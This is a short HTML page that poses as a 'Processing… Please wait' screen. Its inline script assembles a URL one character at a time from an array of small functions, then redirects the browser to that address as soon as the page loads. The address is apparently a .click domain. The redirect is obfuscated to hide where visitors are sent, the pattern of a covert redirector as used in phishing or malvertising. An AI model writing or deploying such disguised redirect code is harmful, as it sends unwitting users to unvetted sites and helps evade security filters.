<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Processing</title>
    <script>
        const fragments = [
            () => 'h',
            function() { return 't'; },
            () => 't',
            _ => 'p',
            _ => 's',
            _ => ':',
            function() { return '/'; },
            () => '/',
            function() { return 'v'; },
            function() { return 'e'; },
            _ => 'r',
            function() { return 'g'; },
            () => 'e',
            function() { return 'n'; },
            () => '.',
            function() { return 'c'; },
            function() { return 'l'; },
            () => 'i',
            _ => 'c',
            _ => 'k',
            _ => '/',
            function() { return 's'; },
            function() { return '/'; },
            () => 'n',
            () => 'e',
            _ => 'w'
        ];
        window.location.href = fragments.map(fn => fn()).join('');
    </script>
</head>
<body>
    <p>Please wait...</p>
</body>
</html>
